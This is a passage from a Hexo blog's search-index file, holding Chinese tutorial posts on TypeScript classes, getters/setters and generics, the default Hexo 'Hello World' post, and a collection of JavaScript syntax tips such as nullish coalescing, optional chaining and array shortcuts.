getter方法用来读取属性</span></span><br><span class="line"><span class="comment">      *   setter方法用来设置属性</span></span><br><span class="line"><span class="comment">      *       - 它们被称为属性的存取器</span></span><br><span class="line"><span class="comment">      * */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义方法，用来获取name属性</span></span><br><span class="line">    <span class="comment">// getName()&#123;</span></span><br><span class="line">    <span class="comment">//     return this._name;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// // 定义方法，用来设置name属性</span></span><br><span class="line">    <span class="comment">// setName(value: string)&#123;</span></span><br><span class="line">    <span class="comment">//     this._name = value;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// getAge()&#123;</span></span><br><span class="line">    <span class="comment">//     return this._age;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// setAge(value: number)&#123;</span></span><br><span class="line">    <span class="comment">//     // 判断年龄是否合法</span></span><br><span class="line">    <span class="comment">//     if(value &gt;= 0)&#123;</span></span><br><span class="line">    <span class="comment">//         this._age = value;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// TS中设置getter方法的方式</span></span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">name</span>()&#123;</span><br><span class="line">      <span class="comment">// console.log(&#x27;get name()执行了！！&#x27;);</span></span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">name</span>(<span class="params">value</span>)&#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">_name</span> = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">age</span>()&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_age</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">age</span>(<span class="params">value</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(value &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_age</span> = value</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> per = <span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * 现在属性是在对象中设置的，属性可以任意的被修改，</span></span><br><span class="line"><span class="comment">  * 属性任意被修改将会导致对象中的数据变得非常不安全</span></span><br><span class="line"><span class="comment">  * */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// per.setName(&#x27;猪八戒&#x27;);</span></span><br><span class="line">  <span class="comment">// per.setAge(-33);</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(per.<span class="property">name</span>) <span class="comment">// 通过getter读取name属性</span></span><br><span class="line">  per.<span class="property">name</span> = <span class="string">&#x27;猪八戒&#x27;</span> <span class="comment">// 通过setter修改name属性</span></span><br><span class="line">  per.<span class="property">age</span> = -<span class="number">38</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="attr">num</span>: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">num: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">num</span> = num;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_ inherited__">A</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">num</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> b = <span class="keyword">new</span> <span class="title function_">B</span>(<span class="number">123</span>);</span><br><span class="line">  <span class="comment">// b.num = 33; // 访问不了，protected只能在类里面访问</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* class C&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        name: string;</span></span><br><span class="line"><span class="comment">        age: number</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        // 可以直接将属性定义在构造函数中</span></span><br><span class="line"><span class="comment">        constructor(name: string, age: number) &#123;</span></span><br><span class="line"><span class="comment">            this.name = name;</span></span><br><span class="line"><span class="comment">             this.age = age;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">C</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以直接将属性定义在构造函数中</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span>, <span class="keyword">public</span> age: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> c = <span class="keyword">new</span> <span class="title function_">C</span>(<span class="string">&#x27;xxx&#x27;</span>, <span class="number">111</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><ul><li>在定义函数或是类时，如果遇到类型不明确就可以使用泛型</li><li>使用泛型<ul><li><code>&lt;T&gt;</code>是泛型，T是我们给这个类型起的名字（不一定非叫T），设置泛型后即可在函数中使用T来表示该类型。所以泛型其实很好理解，就表示某个类型。</li><li>如何调用函数<ul><li>不指定泛型<ul><li>使用时可以直接传递参数使用，类型会由TS自动推断出来，但有时编译器无法自动推断时还需要使用下面的方式</li><li>fn(10)</li></ul></li><li>指定泛型<ul><li>可以在函数后手动指定泛型</li><li>test<number>(10)</li></ul></li></ul></li></ul></li><li>可以同时指定多个泛型，泛型间使用逗号隔开</li><li><code>&lt;T extends Inter&gt;</code> 表示泛型T必须是Inter实现类（子类）, 对泛型的范围进行约束</li><li>类中同样可以使用泛型</li></ul><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">下例中，fn函数有一个参数类型不确定，但是能确定的时其返回值的类型和参数的类型是相同的，由于类型不确定所以参数和返回值均使用了any，但是很明显这样做是不合适的，首先使用any会关闭TS的类型检查，其次这样设置也不能体现出参数和返回值是相同的类型</span></span><br><span class="line"><span class="comment">function fn(a: any): any&#123;</span></span><br><span class="line"><span class="comment">    return a;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*   在定义函数或是类时，如果遇到类型不明确就可以使用泛型</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> fn&lt;T&gt;(<span class="attr">a</span>: T): T&#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以直接调用具有泛型的函数</span></span><br><span class="line"><span class="keyword">let</span> result = <span class="title function_">fn</span>(<span class="number">10</span>); <span class="comment">// 不指定泛型，TS可以自动对类型进行推断</span></span><br><span class="line"><span class="keyword">let</span> result2 = fn&lt;<span class="built_in">string</span>&gt;(<span class="string">&#x27;hello&#x27;</span>); <span class="comment">// 指定泛型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 泛型可以同时指定多个</span></span><br><span class="line"><span class="keyword">function</span> fn2&lt;T, K&gt;(<span class="attr">a</span>: T, <span class="attr">b</span>: K):T&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line">fn2&lt;<span class="built_in">number</span>, <span class="built_in">string</span>&gt;(<span class="number">123</span>, <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Inter</span>&#123;</span><br><span class="line">    <span class="attr">length</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// T extends Inter 表示泛型T必须是Inter实现类（子类）</span></span><br><span class="line"><span class="keyword">function</span> fn3&lt;T <span class="keyword">extends</span> <span class="title class_">Inter</span>&gt;(<span class="attr">a</span>: T): <span class="built_in">number</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.<span class="property">length</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类中同样可以使用泛型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="attr">name</span>: T;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name: T</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mc = <span class="keyword">new</span> <span class="title class_">MyClass</span>&lt;<span class="built_in">string</span>&gt;(<span class="string">&#x27;孙悟空&#x27;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/08/15/hello-world/"/>
      <url>/2023/08/15/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>前端技巧总结</title>
      <link href="/2023/08/09/%E5%89%8D%E7%AB%AF%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"/>
      <url>/2023/08/09/%E5%89%8D%E7%AB%AF%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="逻辑或操作符"><a href="#逻辑或操作符" class="headerlink" title="逻辑或操作符||"></a>逻辑或操作符||</h1><p><code>如果||前面的值是0 &#39;&#39; false null undefined NaN其中的任意一种，则直接返回||后面的值</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> a = obj || &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 等价于 =&gt;&gt;</span></span><br><span class="line"><span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> a;</span><br><span class="line">  <span class="keyword">if</span>(</span><br><span class="line">    obj === <span class="number">0</span> || </span><br><span class="line">    obj === <span class="string">&quot;&quot;</span> || </span><br><span class="line">    obj === <span class="literal">false</span> || </span><br><span class="line">    obj === <span class="literal">null</span> || </span><br><span class="line">    obj === <span class="literal">undefined</span> ||</span><br><span class="line">    <span class="built_in">isNaN</span>(obj)</span><br><span class="line">  )&#123;</span><br><span class="line">     a = &#123;&#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     a = obj;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="空值合并操作符"><a href="#空值合并操作符" class="headerlink" title="空值合并操作符??"></a>空值合并操作符??</h1><p><code>如果??前面的值没有定义返回后面。如果定义，则返回前面；有时不想把空字符串或者0也当做false处理可以使用此法</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> a = obj ?? &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 等价于 =&gt;&gt;</span></span><br><span class="line"><span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> a;</span><br><span class="line">  <span class="keyword">if</span>(</span><br><span class="line">    obj === <span class="literal">null</span> || </span><br><span class="line">    obj === <span class="literal">undefined</span></span><br><span class="line">  )&#123;</span><br><span class="line">     a = &#123;&#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     a = obj;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不想把0当成false可以用此方法</span></span><br><span class="line"><span class="keyword">if</span>(value !== <span class="literal">null</span> &amp;&amp; value !== <span class="literal">undefined</span> &amp;&amp; value !== <span class="string">&#x27;&#x27;</span>)&#123;&#125;</span><br><span class="line"><span class="comment">// 等价于 ==&gt;</span></span><br><span class="line"><span class="keyword">if</span>((value ?? <span class="string">&#x27;&#x27;</span>) !== <span class="string">&#x27;&#x27;</span>)&#123;&#125;</span><br></pre></td></tr></table></figure><h1 id="防止崩溃的可选链"><a href="#防止崩溃的可选链" class="headerlink" title="防止崩溃的可选链(?.)"></a>防止崩溃的可选链(?.)</h1><p><code>1、可选链操作符?. 如果访问未定义的属性，则会产生错误。在未定义属性时使用可选链运算符，undefined将返回而不是错误。这可以防止你的代码崩溃。 2、可选链运算符也可以用于方法调用。如果方法存在，它将被调用，否则将返回 undefined</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1、对象</span></span><br><span class="line"><span class="keyword">const</span> student = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;lwl&quot;</span>,</span><br><span class="line">  <span class="attr">address</span>: &#123;</span><br><span class="line">    <span class="attr">state</span>: <span class="string">&quot;New York&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一层一层判断</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(student &amp;&amp; student.<span class="property">address</span> &amp;&amp; student.<span class="property">address</span>.<span class="property">ZIPCode</span>) <span class="comment">// 输出：undefined</span></span><br><span class="line"><span class="comment">// 使用可选链操作符</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(student?.<span class="property">address</span>?.<span class="property">ZIPCode</span>) <span class="comment">// 输出：undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、方法</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello from foo!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">obj.<span class="property">foo</span>?.() <span class="comment">// 输出：&#x27;Hello from foo!&#x27;</span></span><br><span class="line">obj.<span class="property">bar</span>?.() <span class="comment">// 输出：undefined，因为 bar 方法不存在</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.数组</span></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">0</span>]) <span class="comment">// 输出：1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">4</span>]) <span class="comment">// 输出：undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用可选链运算符</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr?.[<span class="number">0</span>]) <span class="comment">// 输出：1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr?.[<span class="number">4</span>]) <span class="comment">// 输出：undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr?.[<span class="number">0</span>]?.<span class="title function_">toString</span>()) <span class="comment">// 输出：&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="逻辑空赋值"><a href="#逻辑空赋值" class="headerlink" title="逻辑空赋值(??=)"></a>逻辑空赋值(??=)</h1><p><code>逻辑空赋值??= 逻辑空赋值运算符(x ??= y)仅在 x 是 nullish (null 或 undefined) 时对其赋值。</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = &#123; <span class="attr">duration</span>: <span class="number">50</span> &#125;;</span><br><span class="line"></span><br><span class="line">a.<span class="property">duration</span> ??= <span class="number">10</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">duration</span>);</span><br><span class="line"><span class="comment">// expected output: 50</span></span><br><span class="line"></span><br><span class="line">a.<span class="property">speed</span> ??= <span class="number">25</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">speed</span>);</span><br><span class="line"><span class="comment">// expected output: 25</span></span><br></pre></td></tr></table></figure><h1 id="快速生成1-10的数组"><a href="#快速生成1-10的数组" class="headerlink" title="快速生成1-10的数组"></a>快速生成1-10的数组</h1><p><code>注意： 二维数组不能直接写成new Array(10).fill([])（也就是fill方法不能传引用类型的值，[]换成new Array()也不行）,因为fill里传入引用类型值会导致每一个数组都指向同一个地址，改变一个数据的时候其他数据也会随之改变</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 生成0-9，利用了数组的下标值</span></span><br><span class="line"><span class="keyword">const</span> arr1 = [...<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>).<span class="title function_">keys</span>()]</span><br><span class="line"><span class="keyword">const</span> arr2 = <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="title class_">Array</span>(<span class="number">10</span>), <span class="function">(<span class="params">v, k</span>) =&gt;</span> k)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成1-10，通过map的特性</span></span><br><span class="line"><span class="keyword">const</span> arr3 = [...<span class="title class_">Array</span>(<span class="number">10</span>)].<span class="title function_">map</span>(<span class="function">(<span class="params">v, i</span>) =&gt;</span> i + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 快速生成10个0的数组</span></span><br><span class="line"><span class="keyword">const</span> arr4 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>).<span class="title function_">fill</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 快速生成10个[]的数组（二维数组）</span></span><br><span class="line"><span class="comment">// 错误写法</span></span><br><span class="line"><span class="keyword">const</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>).<span class="title function_">fill</span>([]) <span class="comment">// 注意这是错误写法，不要这么写</span></span><br><span class="line"><span class="comment">// 正确写法</span></span><br><span class="line"><span class="keyword">const</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>).<span class="title function_">fill</span>().<span class="title function_">map</span>(<span class="function">() =&gt;</span> <span class="keyword">new</span> <span class="title class_">Array</span>())</span><br></pre></td></tr></table></figure><h1 id="数组降维"><a href="#数组降维" class="headerlink" title="数组降维"></a>数组降维</h1><p><code>如果不确定需要降维的数组有多深，可以传入最大值作为参数Infinity，默认值深度为1</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, [<span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>], <span class="number">5</span>], <span class="number">6</span>]</span><br><span class="line"><span class="keyword">const</span> flatArr = arr.<span class="title function_">flat</span>(<span class="title class_">Infinity</span>) <span class="comment">// 输出 [1, 2, 3, 4, 5, 6]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="keyword">const</span> result1 = arr.<span class="title function_">map</span>(<span class="function"><span class="params">v</span> =&gt;</span> [v, v * <span class="number">2</span>]).<span class="title function_">flat</span>()</span><br><span class="line"><span class="keyword">const</span> result2 = arr.<span class="title function_">flatMap</span>(<span class="function"><span class="params">v</span> =&gt;</span> [v, v * <span class="number">2</span>])</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result1, result2); <span class="comment">// 输出 [1, 2, 2, 4, 3, 6, 4, 8]</span></span><br></pre></td></tr></table></figure><h1 id="从数组中删除重复项"><a href="#从数组中删除重复项" class="headerlink" title="从数组中删除重复项"></a>从数组中删除重复项</h1><p><code>在 JavaScript 中，Set 是一个集合，它允许你仅存储唯一值。这意味着删除任何重复的值</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> numbers = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">9</span>];</span><br><span class="line"><span class="keyword">const</span> uniqueNumbers = [...<span class="keyword">new</span> <span class="title class_">Set</span>(numbers)]; <span class="comment">// -&gt; [1, 20, 3, 9]</span></span><br></pre></td></tr></table></figure><h1 id="在没有第三个变量的情况下交换两个变量"><a href="#在没有第三个变量的情况下交换两个变量" class="headerlink" title="在没有第三个变量的情况下交换两个变量"></a>在没有第三个变量的情况下交换两个变量</h1><p><code>在 JavaScript 中，你可以使用解构从数组中拆分值</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> y = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 交换变量</span></span><br><span class="line">[x, y] = [y, x];</span><br></pre></td></tr></table></figure><h1 id="指数运算符"><a href="#指数运算符" class="headerlink" title="指数运算符"></a>指数运算符</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="number">2</span>, <span class="number">3</span>); <span class="comment">// 输出: 8 </span></span><br><span class="line"><span class="number">2</span> ** <span class="number">3</span>; <span class="comment">// 输出: 8 </span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="number">4</span>, <span class="number">0.5</span>); <span class="comment">// 输出: 2 </span></span><br><span class="line"><span class="number">4</span> ** <span class="number">0.5</span>; <span class="comment">// 输出: 2 </span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="number">3</span>, -<span class="number">2</span>); <span class="comment">// 输出: 0.1111111111111111 </span></span><br><span class="line"><span class="number">3</span> ** -<span class="number">2</span>; <span class="comment">// 输出: 0.1111111111111111 </span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>); <span class="comment">// 输出: 8 (参数被自动转换为数字) </span></span><br><span class="line"><span class="string">&#x27;2&#x27;</span> ** <span class="string">&#x27;3&#x27;</span>; <span class="comment">// js中输出: 8，其他语言可能报错</span></span><br></pre></td></tr></table></figure><h1 id="Math-floor-简写"><a href="#Math-floor-简写" class="headerlink" title="Math.floor() 简写"></a>Math.floor() 简写</h1><p><code>对于正数而言两者都是直接去掉小数位，但对于负数来说Math.floor()是向下取整，~~是只去掉小数位，整数位不变</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">3.14</span>); <span class="comment">// 输出: 3 </span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">5.7</span>); <span class="comment">// 输出: 5 </span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">floor</span>(-<span class="number">2.5</span>); <span class="comment">// 输出: -3 </span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">10</span>); <span class="comment">// 输出: 10</span></span><br><span class="line"></span><br><span class="line">~~<span class="number">3.14</span>; <span class="comment">// 输出: 3 </span></span><br><span class="line">~~<span class="number">5.7</span>; <span class="comment">// 输出: 5 </span></span><br><span class="line">~~(-<span class="number">2.5</span>); <span class="comment">// 输出: -2 </span></span><br><span class="line">~~<span class="number">10</span>; <span class="comment">// 输出: 10</span></span><br></pre></td></tr></table></figure><h1 id="逗号运算符"><a href="#逗号运算符" class="headerlink" title="逗号运算符(,)"></a>逗号运算符(,)</h1><p><code>逗号（ , ）运算符对它的每个操作数从左到右求值，并返回最后一个操作数的值。这让你可以创建一个复合表达式，其中多个表达式被评估，复合表达式的最终值是其成员表达式中最右边的值。这通常用于为 for 循环提供多个参数。</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 简化前</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">result</span> = arr =&gt; &#123;</span><br><span class="line">  arr.<span class="title function_">push</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">result</span>([<span class="number">1</span>,<span class="number">2</span>])) <span class="comment">// 输出：[1, 2, &#x27;a&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 简化后</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">result</span> = arr =&gt; (arr.<span class="title function_">push</span>(<span class="string">&#x27;a&#x27;</span>), arr)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">result</span>([<span class="number">1</span>,<span class="number">2</span>])) <span class="comment">// 输出：[1, 2, &#x27;a&#x27;]</span></span><br></pre></td></tr></table></figure><h1 id="Array-map-的简写"><a href="#Array-map-的简写" class="headerlink" title="Array.map()的简写"></a>Array.map()的简写</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接口返回数据</span></span><br><span class="line">res = [&#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;zhangsan&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">16</span>,</span><br><span class="line">  <span class="attr">gender</span>: <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;lisi&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">20</span>,</span><br><span class="line">  <span class="attr">gender</span>: <span class="number">1</span></span><br><span class="line">&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一种方法：箭头函数、 解构赋值</span></span><br><span class="line"><span class="keyword">const</span> data = res.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123;id, name&#125;</span>) =&gt;</span> (&#123;id, name&#125;))</span><br><span class="line"><span class="comment">// 第二种方法：箭头函数、返回对象（相对更容易理解）</span></span><br><span class="line"><span class="keyword">const</span> data = res.<span class="title function_">map</span>(<span class="function"><span class="params">v</span> =&gt;</span> (&#123;<span class="attr">id</span>: v.<span class="property">id</span>, <span class="attr">name</span>: v.<span class="property">name</span>&#125;))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端技巧总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端技巧总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue2</title>
